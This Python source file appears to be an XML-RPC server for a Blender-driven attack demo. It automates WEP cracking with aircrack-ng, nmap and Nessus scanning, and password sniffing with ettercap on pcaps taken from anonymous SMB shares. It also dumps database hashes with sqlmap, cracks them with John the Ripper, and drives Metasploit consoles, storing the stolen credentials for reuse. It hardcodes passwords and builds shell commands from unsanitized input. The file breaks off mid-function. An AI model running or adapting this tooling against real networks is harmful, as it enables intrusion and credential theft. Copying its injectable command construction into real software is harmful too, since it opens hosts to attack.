#!/usr/bin/python
import socketserver
from xmlrpc.server import SimpleXMLRPCServer
from xmlrpc.server import SimpleXMLRPCRequestHandler
import time
import multiprocessing
import random
import sys 
from subprocess import * 
import postgresql
import re
import subprocess, shlex
from threading import Timer
import fcntl
import os
import os.path
import glob
from twitter import *
from twitter.cmdline import *
import urllib
from netaddr import * 
import lxml.objectify
from NessusXMLRPC import Scanner
import time
import msgpack
import http.client
import sys

#metasploit creds/info
msfuser='msf'
msfpassword='abc123'
msftoken=''
msftokentime=0
msfheaders = {"Content-type" : "binary/message-pack" }
msfconsoleid=0

#hard coded db connection, like a boss ;-]
db = postgresql.open("pq://ksploit:ksploit@localhost/ksploit")

jobs={}

#transaction/middle layer xmlrpc server to run commands and fetch data for blender
#2011: Jeff Bryner
#Called using xmlrpc, this server is multithreaded and async
#and will initialize a job reference for blender to use to drop off and pick up results. 
#
#Sample client/blender Code: 
#import xmlrpc.client
#from time import sleep
#s = xmlrpc.client.ServerProxy('http://localhost:8000')
# #Print list of available methods
#print(s.system.listMethods())
# #Call a function in the server and print results when they are ready:
#psjob=s.pscount()
#while s.jobresult(psjob) in ('','<queued>','<started>'):
#	sleep(1)
#	print("no result yet...")
#aresult=s.jobresult(psjob)
#print('pscount result is:'  + str(aresult))

safestringre=re.compile('[\x00-\x08\x0B-\x0C\x0E-\x1F\x80-\xFF]')
def safestring(badstring):
    """makes a good strings out of a potentially bad one by escaping chars 
    out of printable range or ones that screw up xmlrpc transmission"""
    safechars=safestringre.sub('',badstring)
    return safechars




# Threaded mix-in to handle more than one client at a time.
class AsyncXMLRPCServer(socketserver.ThreadingMixIn,SimpleXMLRPCServer): pass

#http://code.activestate.com/recipes/576684-simple-threading-decorator/
def run_async(func):
    """
    run_async(func)
    function decorator, intended to make "func" run in a separate
    thread (asynchronously).
    Returns the created Thread object

    E.g.:
    @run_async
    def task1():
    do_something

    @run_async
    def task2():
    do_something_too

    t1 = task1()
    t2 = task2()
    ...
    t1.join()
    t2.join()
    """
    from threading import Thread
    from multiprocessing import Process	
    from functools import wraps

    @wraps(func)
    def async_func(*args, **kwargs):
        func_hl = Thread(target = func, args = args, kwargs = kwargs)
        func_hl.start()
        return func_hl

    return async_func

def nonBlockRead(output):
    try:
        fd = output.fileno()
        fl = fcntl.fcntl(fd, fcntl.F_GETFL)
        fcntl.fcntl(fd, fcntl.F_SETFL, fl | os.O_NONBLOCK)
        out= output.read()
        if out !=None:
            return out
        else:
            return b''
    except:
        return b''


def kill_proc(proc):
    try:
        proc.stdout.close()  # If they are not closed the fds will hang around until
        proc.stderr.close()  # os.fdlimit is exceeded and cause a nasty exception
        proc.kill()     # Important to close the fds prior to terminating the process!
    except:
        pass

def cmdTimeout(cmd, timeout_sec):
    #run a command for awhile, timeout if it doesn't complete in the time alloted.
    proc = subprocess.Popen(shlex.split(cmd), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    timer = Timer(timeout_sec, kill_proc, [proc])
    timer.start()
    stdout = ''
    stderr = ''    
    while proc.poll() is None : # Monitor process
        time.sleep(0.1) # Wait a little

        # p.std* blocks on read(), which messes up the timeout timer.
        # To fix this, we use a nonblocking read()
        # Note: Not sure if this is Windows compatible
        stdout+= str(nonBlockRead(proc.stdout).decode("utf-8"))
        stderr+= str(nonBlockRead(proc.stderr).decode("utf-8"))  
    timer.cancel()
    returncode  = proc.returncode
    return (returncode, stdout, stderr)    



@run_async
def mygetDate(myid):
    #simpleton test case.
    jobs[myid]='<started>'    
    sout=getoutput("date")
    jobs[myid]=sout


@run_async
def mygetHelp(myid,command):
    #get help text for any command.
    jobs[myid]='<started>'    
    sout=getoutput(command + " --help")
    jobs[myid]=sout

@run_async
def myscanAccessPoints(myid):
    #clear the table
    db.execute("truncate table accesspoints;")
    #regex to find new APs from iwlist output
    bssidre= re.compile(r"""Cell \d\d - Address: (.*)""",re.IGNORECASE)
    essidre= re.compile(r"""ESSID:(.*)""",re.IGNORECASE)
    channelre= re.compile(r"""Channel:(.*)""",re.IGNORECASE)
    #cooking show
    sout=getoutput("cat iwlistout.txt")
    time.sleep(random.randint(5,15))
    #real life
    #sout=getoutput("iwlist scan")
    x=0
    insertAP = db.prepare("INSERT INTO accesspoints (essid,bssid,channel) VALUES ($1, $2, $3)")    
    for foundbssid in bssidre.findall(sout):
        #print(foundbssid, essidre.findall(sout)[x], channelre.findall(sout)[x])
        result=insertAP(essidre.findall(sout)[x],foundbssid,int(channelre.findall(sout)[x]))
        x+=1    
    jobs[myid]=sout

@run_async
def mygetAccessPoints(myid):
    dbrows=db.prepare("select * from accesspoints;")
    #make a list of dictionaries for the rows/columns/values
    rows=[]    
    if dbrows.first() != None:
        columns=dbrows.first().column_names

        for rowset in dbrows.chunks():
            for aset in rowset:
                y=0
                row={}    
                for colname in columns:
                    row[colname]=aset[y]
                    y+=1
                rows.append(row)
    jobs[myid]=rows

@run_async
def mymonitorAccessPoint(myid,bssid):
    #run airomon-ng for this ap
    jobs[myid]='<started>'    
    #real life
    #rcode,sout,serr=cmdTimeout("airodump-ng --output-format pcap --bssid " + bssid + " -w output/airodump." + bssid + " mon0",60)
    #cooking show
    sout=getoutput("cp seeddata/*.cap output/")
    time.sleep(random.randint(5,30))
    sout=glob.glob("output/*cap")
    jobs[myid]=sout

@run_async
def mycrackWEPAccessPoint(myid,bssid,pcapfilename):
    #run aircrack-ng for this ap
    jobs[myid]='<started>'    
    #aircrack doesn't finish/return anything if it doesn't crack the key
    #so only insert a key if return code
    rcode,sout,serr=cmdTimeout("aircrack-ng -q -b " + bssid + " -l output/" +bssid + ".wep output/" + pcapfilename,15)
    if len(sout)> 0 and rcode==0:
        updateAPKey = db.prepare("UPDATE accesspoints set key=$1 where bssid=$2")    
        keyfile=open("output/"+bssid + ".wep")
        key=keyfile.read()
        result=updateAPKey(key,bssid.upper())
        jobs[myid]=key
    elif len(serr)>0:
        jobs[myid]=serr
    else:
        jobs[myid]="<finished:timeout>"


@run_async
def mygetTweets(myid,tweetcount,searchterm):
    jobs[myid]='<started>'        
    arg_options = {}
    parse_args('', arg_options )
    options = dict(OPTIONS)
    oauth_filename = os.path.expanduser(options['oauth_filename'])
    oauth_token, oauth_token_secret = read_token_file(oauth_filename)
    twitter = Twitter(auth=OAuth(oauth_token, oauth_token_secret, CONSUMER_KEY, CONSUMER_SECRET),secure=options['secure'],api_version='1',domain='api.twitter.com')
    twitter.account.verify_credentials()['screen_name']    
    #return selected parameters
    returnlist=[]       
    #get tweets
    #are we searching or just gathering the timeline? API is different...
    if len(searchterm)>0:
        twitter.domain="search.twitter.com"
        twitter.uriparts=()
        query_string="".join(quote(searchterm))
        tweets = twitter.search(rpp=tweetcount,q="+"+query_string)['results']
        for tweet in tweets:
            returntweet={}
            try:
                origfile='twitterimages/' +str(tweet['from_user_id_str'])
                blendfile=origfile + '.png'            
                returntweet['name']=tweet['from_user_name'].encode("ascii",'ignore').decode('ascii')
                returntweet['text']=tweet['text'].encode("ascii",'ignore').decode('ascii')
                returntweet['image']=blendfile
                returntweet['userid']=str(tweet['from_user_id_str'])            
                returnlist.append(returntweet)
                if not os.path.isfile(origfile):
                    urllib.request.urlretrieve(url=tweet['profile_image_url'],filename=origfile)
                    sout=getoutput('convert ' + origfile + ' ' + blendfile )
                    ret=call(["convert",origfile,blendfile])
                    if ret!=0: #fallback
                        ret=call(["cp",origfile,blendfile])
            except Exception as e:
                print(e)
                pass

    else:
        tweets=twitter.statuses.friends_timeline(count=tweetcount)    
        for tweet in tweets:
            returntweet={}
            try:
                origfile='twitterimages/' +str(tweet['user']['id'])
                blendfile=origfile + '.png'            
                returntweet['name']=tweet['user']['screen_name'].encode("ascii",'ignore').decode('ascii')
                returntweet['text']=tweet['text'].encode("ascii",'ignore').decode('ascii')
                returntweet['image']=blendfile
                returntweet['userid']=str(tweet['user']['id'])            
                returnlist.append(returntweet)
                if not os.path.isfile(origfile):
                    urllib.request.urlretrieve(url=tweet['user']['profile_image_url'],filename=origfile)
                    sout=getoutput('convert ' + origfile + ' ' + blendfile )
                    ret=call(["convert",origfile,blendfile])
                    if ret!=0: #fallback
                        ret=call(["cp",origfile,blendfile])
            except Exception as e:
                print(e)
                pass
    jobs[myid]=returnlist



@run_async
def mygetSnortStats(myid):
    #summary of snort alerts like so: 
    #count/priority/alert name
    # 1536 2 (http_inspect)
    # 10 2 PSNG_UDP_PORTSWEEP:
    # 3 2 PSNG_TCP_PORTSCAN:
    # 2 2 PSNG_TCP_FILTERED_PORTSCAN:
    # 1 2 PSNG_UDP_PORTSWEEP_FILTERED:
    # 1 2 PSNG_TCP_PORTSWEEP:
    jobs[myid]='<started>'    
    listout=[]
    #rawoutput=getoutput("cat  /var/log/snort/fast_output | ./scripts/snortparse.py | cut -f1,2 -d' ' | sort |uniq -c | sort -rn")
    rawoutput=getoutput("nice cat  /var/log/snort/fast_output | ./scripts/snortparse.py | cut -f1 -d':' | sort |uniq -c | sort -rn")
    if len(rawoutput)>0:
        lines=rawoutput.split('\n')
        for line in lines:
            dictout={}
            dictout["message"]=line[10:]
            dictout["priority"]=line.split(' ')[7]
            dictout["count"]=line.split(' ')[6]
            listout.append(dictout)
    jobs[myid]=listout


@run_async
def mygetSnortPriorityTotals(myid):
    #summary of snort alerts like so: 
    #count/priority
    # 1536 2
    # 10 1 
    # 1 3
    jobs[myid]='<started>'    
    listout=[]    
    rawoutput=getoutput("nice cat  /var/log/snort/fast_output | ./scripts/snortparse.py | cut -f1 -d' ' | sort |uniq -c | sort -rn")
    if len(rawoutput)>0:
        lines=rawoutput.split('\n')    
        for line in lines:
            dictout={}
            dictout["priority"]=line.split(' ')[-1]
            dictout["count"]=line.split(' ')[-2]
            listout.append(dictout)
    jobs[myid]=listout

@run_async
def mygetNetworks(myid):
    #puruse the ifconfig and route outputs for signs of a connected network.
    jobs[myid]='<started>'  
    listout=[]
    iprouteoutput=getoutput("ip route | grep -vi default")
    #output should be like so:
    #default via 192.168.1.1 dev eth0  metric 2 
    #10.99.99.1 via 10.99.99.5 dev tun0 
    #10.99.99.5 dev tun0  proto kernel  scope link  src 10.99.99.6 
    #10.99.100.0/24 via 10.99.99.5 dev tun0 
    #127.0.0.0/8 via 127.0.0.1 dev lo 
    #192.168.1.0/24 dev eth0  proto kernel  scope link  src 192.168.1.102  metric 2 

    #parse out the ip networks and gateway devices (eth/tun/lo, etc)
    #ip is first then whatever is after 'dev' is the device
    inetre= re.compile(r"""(.*?) .*dev (.*?) """,re.IGNORECASE)
    for foundinet in inetre.findall(iprouteoutput):
        ipnet=IPNetwork(foundinet[0])
        cidr=str(ipnet.cidr)
        netname=foundinet[1]
        device=foundinet[1]

        #weed out the cidr/32 hosts that end up in routes and only return the networks.    
        #add this to our list? Only if we don't already have it..
        if len(listout)==0 and '/32' not in cidr:
            network={}
            network["name"]=netname
            network["cidr"]=cidr
            network["key"]=""
            network["device"]=device
            listout.append(network)
        else:            
            cidrlist=[]
            for net in listout:
                cidrlist.append(net['cidr'])
            if cidr not in cidrlist and ('/32' not in cidr):
                network={}
                network["name"]=netname
                network["cidr"]=cidr
                network["key"]=""
                network["device"]=device
                listout.append(network)

    jobs[myid]=listout

@run_async
def myscanNetwork(myid,cidr):
    #nmap scan the cidr mask
    jobs[myid]='<started>'  
    ip=IPNetwork(cidr)
    cidrfilename=str(ip).replace('/','.')  #192.168.1.0/24 becomes 192.168.1.0.24 or nmap complains.    
    listout=[]
    nmapoutput=getoutput("nmap --traceroute -oA ./output/" + cidrfilename + " " + cidr)
    xmlfilename=os.getcwd() + "/output/" + cidrfilename + ".xml"
    graphoutput=getoutput("./scripts/pynmapdiagram.py " + xmlfilename)
    #now return a dictionary to the caller listing the hosts/ports that we found in the xml file
        #create a python list of dictionaries for hosts and ports.
    nxml=lxml.objectify.parse(xmlfilename)
    nroot=nxml.getroot()
    for nhost in nroot.findall("//*[local-name()='host']"):
        hosttags=[]
        hostname='unknown'
        hostaddr='unknown'
        ports=[]
        port={}
        host={}

        for child in nhost.getchildren():
            hosttags.append(child.tag)       
            for child2 in child.getchildren():
                hosttags.append(child2.tag)       


        if 'hostname' in hosttags:
            for nname in nhost.hostnames:
                hostname=nname.hostname.attrib.get("name")	

        for naddr in nhost.address:
            if naddr.attrib.get("addrtype")=="ipv4":
                hostaddr=naddr.attrib.get("addr")

        if 'port' in hosttags:
            for nport in nhost.ports.port:
                port={}
                port['portid']=nport.attrib.get("portid")
                port['protocol']=nport.attrib.get("protocol")
                port['state']=nport.state.attrib.get("state")
                port['name']=nport.service.attrib.get("name")
                ports.append(port)
        host['hostname']=hostname
        host['ip']=hostaddr	
        host['ports']=ports

        listout.append(host)
    jobs[myid]=listout


@run_async
def mynessusScan(myid,target):
    jobs[myid]='<started>'  
    listout=[]
    reportid=''
    reportRunning=True
    
    #commentout for cooking show version    
    #scanner = Scanner( 'localhost', 8834, 'nessus', 'nononotnessus')
    
    #ret=scanner.quickScan('ksploit', target, 'ksploit')
    #if len(ret)>0:
        #reportid=ret
    #else:
        ##something happened..bail.
        #reportRunning=False

    #while reportRunning:
        #reports=scanner.reportList()
        #for report in reports:          
            #if report['status']=='completed' and report['name']==reportid:
                #reportRunning=False
        #time.sleep(4)
    #endcommentout    
    #report is done, get output
    listout=[]
    findings=[]
    finding={}
    host={}
    #reportxml=scanner.reportDownload(reportid)
    #fake some output
    reportxml=b'<?xml version="1.0" ?>\n<NessusClientData_v2>\n<Report name="ksploit" xmlns:cm="http://www.nessus.org/cm">\n<ReportHost name="192.168.1.1"><HostProperties>\n<tag name="HOST_END">Sat Jul  7 21:05:00 2012</tag>\n<tag name="operating-system">3Com SuperStack Switch\nHP ProCurve Switch\nVxWorks</tag>\n<tag name="host-ip">192.168.1.1</tag>\n<tag name="host-fqdn">wireless</tag>\n<tag name="HOST_START">Sat Jul  7 21:00:22 2012</tag>\n</HostProperties>\n<ReportItem port="80" svc_name="www" protocol="tcp" severity="0" pluginID="22964" pluginName="Service Detection" pluginFamily="Service detection">\n<description>It was possible to identify the remote service by its banner or by looking at the error message it sends when it receives an HTTP request.</description>\n<fname>find_service.nasl</fname>\n<plugin_modification_date>2012/07/03</plugin_modification_date>\n<plugin_name>Service Detection</plugin_name>\n<plugin_publication_date>2007/08/19</plugin_publication_date>\n<plugin_type>remote</plugin_type>\n<risk_factor>None</risk_factor>\n<solution>n/a</solution>\n<synopsis>The remote service could be identified.</synopsis>\n<plugin_output>A web server is running on this port.</plugin_output>\n</ReportItem>\n<ReportItem port="67" svc_name="bootps?" protocol="udp" severity="1" pluginID="10663" pluginName="DHCP Server Detection" pluginFamily="Service detection">\n<cvss_base_score>3.3</cvss_base_score>\n<cvss_vector>CVSS2#AV:A/AC:L/Au:N/C:P/I:N/A:N</cvss_vector>\n<description>This script contacts the remote DHCP server (if any) and attempts to retrieve information about the network layout. \n\nSome DHCP servers provide sensitive information such as the NIS domain name, or network layout information such as the list of the network web servers, and so on. \n\nIt does not demonstrate any vulnerability, but a local attacker may use DHCP to become intimately familiar with the associated network.</description>\n<fname>dhcp.nasl</fname>\n<plugin_modification_date>2011/03/21</plugin_modification_date>\n<plugin_name>DHCP Server Detection</plugin_name>\n<plugin_publication_date>2001/05/05</plugin_publication_date>\n<plugin_type>remote</plugin_type>\n<risk_factor>Low</risk_factor>\n<solution>Apply filtering to keep this information off the network and remove any options that are not in use.</solution>\n<synopsis>The remote DHCP server may expose information about the associated network.</synopsis>\n<plugin_output>\nNessus gathered the following information from the remote DHCP server :\n\n  Master DHCP server of this network : 192.168.1.1\n  IP address the DHCP server would attribute us : 192.168.1.102\n  DHCP server(s) identifier : 192.168.1.1\n  Netmask : 255.255.255.0\n  Router : 192.168.1.1\n  Domain name server(s) : 75.75.75.75 , 75.75.75.76\n  Domain name : hsd1.or.comcast.net.\n\n</plugin_output>\n</ReportItem>\n<ReportItem port="80" svc_name="www" protocol="tcp" severity="0" pluginID="11219" pluginName="Nessus SYN scanner" pluginFamily="Port scanners">\n<description>This plugin is a SYN &apos;half-open&apos; port scanner.\nIt shall be reasonably quick even against a firewalled target.\n\nNote that SYN scanners are less intrusive than TCP (full connect) scanners against broken services, but they might kill lame misconfigured firewalls. They might also leave unclosed connections on the remote target, if the network is loaded.</description>\n<fname>nessus_syn_scanner.nbin</fname>\n<plugin_modification_date>2011/04/05</plugin_modification_date>\n<plugin_name>Nessus SYN scanner</plugin_name>\n<plugin_type>remote</plugin_type>\n<risk_factor>None</risk_factor>\n<solution>Protect your target with an IP filter.</solution>\n<synopsis>It is possible to determine which TCP ports are open.</synopsis>\n<plugin_output>Port 80/tcp was found to be open</plugin_output>\n</ReportItem>\n</ReportHost>\n</Report>\n</NessusClientData_v2>\n'
    time.sleep(random.randint(5,10))
    reportxml=open("./output/nessussmb.xml").read()    
    nxml=lxml.objectify.fromstring(reportxml)
    for nreportHost in nxml.findall("//*[local-name()='ReportHost']"):
        host={}
        host['hostName']=nreportHost.attrib.get("name")
        findings=[]
        for nreportitem in nreportHost.ReportItem:
            reporttags=[]
            for child in nreportitem.getchildren():
                reporttags.append(child.tag)
            if int(nreportitem.attrib.get("severity"))>=0:
                finding={}
                finding['severity']=nreportitem.attrib.get("severity")
                finding['pluginName']=nreportitem.attrib.get("pluginName")
                finding['pluginID']=nreportitem.attrib.get("pluginID")
                finding['synopsis']=''
                finding['output']=''                
                if 'synopsis' in reporttags: 
                    finding['synopsis']=str(nreportitem.synopsis)                   
                if 'plugin_output' in reporttags:
                    finding['output']=str(nreportitem.plugin_output)

                findings.append(finding)            
        host['findings']=findings
        listout.append(host)                  
    jobs[myid]=listout

@run_async
def mysayText(myid,speechText):
    jobs[myid]='<started>'  
    listout=[]
    speechFile=os.getcwd() + '/' + str(myid).replace(':','.')+'.txt'
    waveFile=os.getcwd() + '/' + str(myid).replace(':','.')+'.wav'
    fout=open(speechFile,'w')
    fout.write(speechText)
    fout.close()
    scmd="swift -p speech/rate=140 -f %s -o %s"%(speechFile,waveFile)
    sout=getoutput(scmd)
    sout=getoutput("aplay %s" %(waveFile))
    sout=getoutput("rm %s %s"%(speechFile,waveFile))
    jobs[myid]=listout


@run_async
def myettercapPcap(myid,hostIP,nessusFindings):
    """expects a list of nessus findings including an smb share with a pcap file
       This retrieves the pcap file, runs ettercap against it and returns the results
    """
    jobs[myid]='<started>'  
    listout=[]
    shares=[]

    for finding in nessusFindings:
        if finding['pluginID'] in ('10395'):
            """
            Process plugin output like this: to get shares that aren't administrative (ending in $)
            Here are the SMB shares available on the remote host when logged as lbbiwmgm:
            
              - IPC$
              - filez
              - ADMIN$
              - C$
              """
            for line in finding['output'].split('\n'):
                if len(line)>0:
                    content=line.strip()
                    if content[-1]!='$' and content[0]=='-':
                        shares.append(content[2:])
    files=[]
    for share in shares: 
        smbcommand='smbclient -N //%s/%s \"\" -c "dir *"' %(hostIP,share)        
        sout=getoutput(smbcommand)
        """
        output is like:
        Domain=[WINXP-95C9409AB] OS=[Windows 5.1] Server=[Windows 2000 LAN Manager]
          .                                   D        0  Sun Jul  8 13:11:36 2012
          ..                                  D        0  Sun Jul  8 13:11:36 2012
          test.txt                            A        9  Sun Jul  8 13:07:21 2012
        
                        40852 blocks of size 131072. 24073 blocks available
        """        
        #print(sout)
        reword=re.compile(r"""\s{5}(.*?)\s""")
        for line in sout.split('\n'):
            if not line.startswith("Domain") and not 'blocks of size' in line and len(line)>0:
                afile=(line[2:35].strip())
                if len(afile)>0 and afile not in ('.','..'):
                    files.append(afile)
        
    ecapcreds=[]
    ecapcredsre=re.compile(r"""USER: (.*?)  PASS: (.*?)\s""")
    for file in files: 
        if 'pcap' in file:
            smbcommand='smbclient -N //%s/%s \"\" -c "get %s "' %(hostIP,share,file)        
            sout=getoutput(smbcommand)
            if os.path.isfile(file):
                ecapcmd="ettercap -Tq -r %s"%(file)
                sout=getoutput(ecapcmd)
                for ecapcred in ecapcredsre.findall(sout):
                    cred={}
                    cred['username']=ecapcred[0].strip()
                    cred['password']=ecapcred[1].strip()

                    if cred not in ecapcreds:
                        ecapcreds.append(cred)

    insertCred = db.prepare("INSERT INTO creds (username,password) VALUES ($1, $2)")    
    dbrows=db.prepare("select * from creds where username =$1 and password=$2;")
    for cred in ecapcreds:
        if dbrows.first(cred["username"],cred["password"]) == None:
            #result=insertAP(essidre.findall(sout)[x],foundbssid,int(channelre.findall(sout)[x]))
            result=insertCred(cred["username"],cred["password"])

                    
    jobs[myid]=ecapcreds


@run_async
def mygetCreds(myid):
    jobs[myid]='<started>'  
    rows=[]
    rows=dbGetCreds()
    jobs[myid]=rows


def dbGetCreds(nullPassword=True):
    """ non async function to get creds since we will use this internally """
    if nullPassword:
        dbrows=db.prepare("select * from creds;")
    else: 
        dbrows=db.prepare("select * from creds where password is not null;")
    #make a list of dictionaries for the rows/columns/values
    rows=[]    
    if dbrows.first() != None:
        columns=dbrows.first().column_names
        for rowset in dbrows.chunks():
            for aset in rowset:
                y=0
                row={}    
                for colname in columns:
                    row[colname]=aset[y]
                    y+=1
                rows.append(row)
    return rows


@run_async
def mygetSiteURLS(myid,startingURL,useCreds=False):
    jobs[myid]='<started>'  
    listout=[]
    wgetoutFile=os.getcwd() + '/' + str(myid).replace(':','.')+'.txt'    
    #default command we will run
    wgetcmd="wget -r --spider -o %s %s"%(wgetoutFile,startingURL)
    if useCreds:
        creds=dbGetCreds(nullPassword=False)
        if len(creds)>0:
            username=creds[0]['username']
            password=creds[0]['password']        
            wgetcmd="wget -r --spider -o %s --http-user='%s' --http-password='%s' %s"%(wgetoutFile,username,password,startingURL)    
        
    sout=getoutput(wgetcmd)
    grepcmd="grep http %s | grep -v following"%(wgetoutFile)
    sout=getoutput(grepcmd)
    urlre=re.compile(r"""(http://.*)""")
    for line in sout.split('\n'):
        for url in urlre.findall(line):
            if url not in listout:
                listout.append(url)
    sout=getoutput("rm %s"%(wgetoutFile))
    jobs[myid]=listout

@run_async
def mysqlMap(myid,startingURL,useCreds=False):
    jobs[myid]='<started>'  
    listout=[]
    #default command we will run: 
    sqlmapcmd=os.getcwd() + "/scripts/sqlmap/sqlmap.py -c ./scripts/sqlmap/sqlmap.conf --forms --batch -u %s --passwords "%(startingURL)    
    #do we need to use creds? 
    if useCreds:
        creds=dbGetCreds(nullPassword=False)
        if len(creds)>0:
            username=creds[0]['username']
            password=creds[0]['password']
            sqlmapcmd=os.getcwd() + "/scripts/sqlmap/sqlmap.py -c ./scripts/sqlmap/sqlmap.conf --forms --batch -u %s --passwords --auth-cred=%s:%s --auth-type=Basic"%(startingURL,username,password)

    sout=getoutput(sqlmapcmd)
    #look for line like this to see where it's putting it's log   
    #[INFO] using '/home/jab/development/blender/kinectasploit/v2/blenderhelper/scripts/sqlmap/output/10.200.100.8/session' as session file"    
    sessionfile=''
    logfile=''
    creds=[]
    for line in sout.split('\n'):
        if "as session file" in line: 
            sessionfilere=re.compile(r"""INFO. using '(.*?)' as session file""")
            for afile in sessionfilere.findall(line):
                sessionfile=afile
        listout.append(line)
    #print(sout)
    logfile=sessionfile.replace('session','log')    
    #print(logfile)

    userre=re.compile(r"""\[\*\] (.*?) \[\d{1,2}\]:""")
    hashre=re.compile(r"""password hash: (.*)""")
    auser=''
    ahash=''
    if os.path.isfile(logfile):
        f=open(logfile)
        for line in f.read().split('\n'):
            #print(line)
            #if 'users password hashes' in line: 
            #next line will have a user
            for user in userre.findall(line):
                #print('USER:' + user)
                auser=user
                
            for ahash in hashre.findall(line):
                #print('HASH:' + ahash)
                if ahash != 'NULL':
                    cred={}
                    cred['username']=auser.strip()
                    cred['hash']=ahash.strip()                
                    if cred not in creds:
                        creds.append(cred)
    #print(creds)
    insertCred = db.prepare("INSERT INTO creds (username,hash) VALUES ($1, $2)")    
    dbrows=db.prepare("select * from creds where username =$1 and hash=$2;")
    for cred in creds:
        if dbrows.first(cred["username"],cred["hash"]) == None:
            result=insertCred(cred["username"],cred["hash"])         
    jobs[myid]=creds

@run_async
def myjohnCrackCreds(myid,creds={}):
    jobs[myid]='<started>'  
    listout=[]
    print(creds)
    #write the creds to a file
    credFile=os.getcwd() + '/output/' + str(myid).replace(':','.')+'.txt'
    #waveFile=os.getcwd() + '/' + str(myid).replace(':','.')+'.wav'
    fout=open(credFile,'w')
    for cred in creds:
        if 'password' not in cred.keys():
            cred['password']=None
        if cred['password'] is None and cred['username'] not in ('None',None) and cred['hash'] not in ('None',None):
            credline="%s:%s\n"%(cred['username'],cred['hash'])
            fout.write(credline)        
    fout.close()
    
    #sick john on the file for a while
    johncmd=os.getcwd() +'/scripts/john/john %s' %(credFile)
    sout=getoutput(johncmd)
    print(sout)
    #check the john.pot file for any matching results
    johnPot=credFile=os.getcwd() + '/scripts/john/john.pot'
    fPot=open(johnPot)
    for potLine in fPot.read().split('\n'):
        print(potLine)
        if len(potLine.strip())>0:
            pothash=potLine.split(':')[0]
            potpassword=potLine.split(':')[1]
            #update the creds with any cracks        
            for cred in creds: 
                if cred['hash']==pothash:
                    if cred['password'] is None:
                        cred['password']=potpassword            
    jobs[myid]=creds


@run_async
def mymsfConsoleCreate(myid,ForceNew=False):
    jobs[myid]='<started>'  
    listout=[]    
    msfToken()
    msfConsole(ForceNew)
    jobs[myid]=listout


@run_async
def mymsfConsoleWrite(myid,msfcommand):
    jobs[myid]='<started>'  
    listout=[]    
    msfToken()
    msfConsole()

    #command(s) to run in the msfconsole
    #send multiple like so: 
    #command=r"""one
    #two
    #three"""    
    if '\n' not in msfcommand:
        #add a line feed, most likely a single line command
        msfcommand+="\r\n"        
    if type(msfcommand)!=bytes:
        msfcommand=msfcommand.encode('ascii')
    #print(msfcommand)
    client =  http.client.HTTPConnection('localhost',55552)        
    params=msgpack.packb(['console.write',msftoken,msfconsoleid,msfcommand])
    client =  http.client.HTTPConnection('localhost',55552)        
    client.request("POST","/api/",params, msfheaders)
    response = client.getresponse()
    if response.status == 200:
        #listout.append(msgpack.unpackb(response.read()))
        resdata=msgpack.unpackb(response.read()) 
        #should be like this: {b'wrote': 33}        
    jobs[myid]=listout
        
        
@run_async
def mymsfConsoleRead(myid):
    jobs[myid]='<started>'  
    listout=[]        
    msfToken()
    msfConsole()
     
    #results?
    client =  http.client.HTTPConnection('localhost',55552)        
    params=msgpack.packb(['console.read',msftoken,msfconsoleid])
    client.request("POST","/api/",params, msfheaders)
    response = client.getresponse()
    if response.status == 200:
        resdata=msgpack.unpackb(response.read())
        if len(resdata[b'data'])>0:
            for line in bytes.decode(resdata[b'data']).split('\n'):
                dictout={}
                #remove the msf > prompt and spaces since we've got limited space
                #and remove any \x01\x02 type chars in the prompt since it errors python xmlrpc.
                prompt=safestring(bytes.decode(resdata[b'prompt']))
                prompt=prompt.replace('msf > ','')
                prompt=prompt.replace('msf','')
                dictout['prompt']=prompt.strip()
                dictout['line']=safestring(line)
                listout.append(dictout)
    jobs[myid]=listout


@run_async
def mymsfHosts(myid):
    jobs[myid]='<started>'  
    listout=[]    
    msferror=False
    global msftoken
    msfToken()
    
    #return a dict of all hosts info

    client =  http.client.HTTPConnection('localhost',55552)        
    params=msgpack.packb(['db.hosts',msftoken,[]])
    client.request("POST","/api/",params, msfheaders)
    response = client.getresponse()
    if response.status == 200:
        resdata=msgpack.unpackb(response.read())
        if b'error_message' in resdata.keys():
            msferror=True
            print(resdata[b'error_message'])
    #	print(resdata) #{b'hosts': ({b'info': b'', b'os_sp': b'', b'os_lang': b'', b'os_name': b'', b'name': b'', b'created_at': 1325119167, b'updated_at': 1325119167, b'mac': b'00:16:C6:46:28:18', b'state': b'alive', b'purpose': b'', b'address': b'192.168.10.10', b'os_flavor': b''},)}
    else:
        print("db.hosts failed")
        msferror=True
    
    if not msferror:
        if len(resdata[b'hosts'])>0:
            for host in resdata[b'hosts']:
                ahost={}
                ahost['name']=bytes.decode(host[b'name'])
                ahost['address']=bytes.decode(host[b'address'])
                listout.append(ahost)
                #print(bytes.decode(host[b'name']),bytes.decode(host[b'address']))
    jobs[myid]=listout

def msfToken():
    global msftoken
    global msftokentime
    if msftoken=='' or ( int(time.time())-int(msftokentime)>180 ) :        
        print('getting token')
        client =  http.client.HTTPConnection('localhost',55552)
        params = msgpack.packb(['auth.login',msfuser,msfpassword])
        client.request("POST", "/api/", params, msfheaders)
        response = client.getresponse()
        if response.status == 200:
            data = response.read()
        else:
            return -1
        res = msgpack.unpackb(data)
        #print(res)
        if res[b'result'] == b'success':
            msftoken = res[b'token']
    msftokentime=time.time()

def mymsfNewConsole(myid):
    jobs[myid]='<started>'
    listout=[]
    global msftoken
    global msfconsoleid
    msfToken()
    msfconsoleid=0
    jobs[myid]=listout

def msfConsole(ForceNew=False):
    global msftoken
    global msfconsoleid
    
    msfToken()
    if msfconsoleid==0 or ForceNew:
        client =  http.client.HTTPConnection('localhost',55552)    
        params=msgpack.packb(['console.create',msftoken])
        client.request("POST","/api/",params, msfheaders)
        response = client.getresponse()
        if response.status == 200:
            resdata=msgpack.unpackb(response.read())
            #print(resdata) #{'busy': False, 'prompt': 'msf > ', 'id': '12'}
            msfconsoleid=resdata[b'id']
            return msfconsoleid
        else:
            #print("Console.create failed")  
            return 0
        


@run_async
def mynbdConnect(myid):
    jobs[myid]='<started>'
    #check if we are already connected.
    sout=getoutput("nbd-client -c /dev/nbd0 ")
    if len(sout)==0: #not connected
        sout=getoutput("nbd-client localhost 10005 /dev/nbd0 ")
    jobs[myid]=sout


@run_async
def mynbdDisconnect(myid):
    jobs[myid]='<started>'
    sout=getoutput("nbd-client -d /dev/nbd0 ")
    jobs[myid]=sout


@run_async
def mygetFLS(myid,searchString):
    jobs[myid]='<started>'
    listout=[]
    if len(searchString)==0:
        sout=getoutput("fls -f ntfs -m / -r  /dev/nbd0 ")
    else:
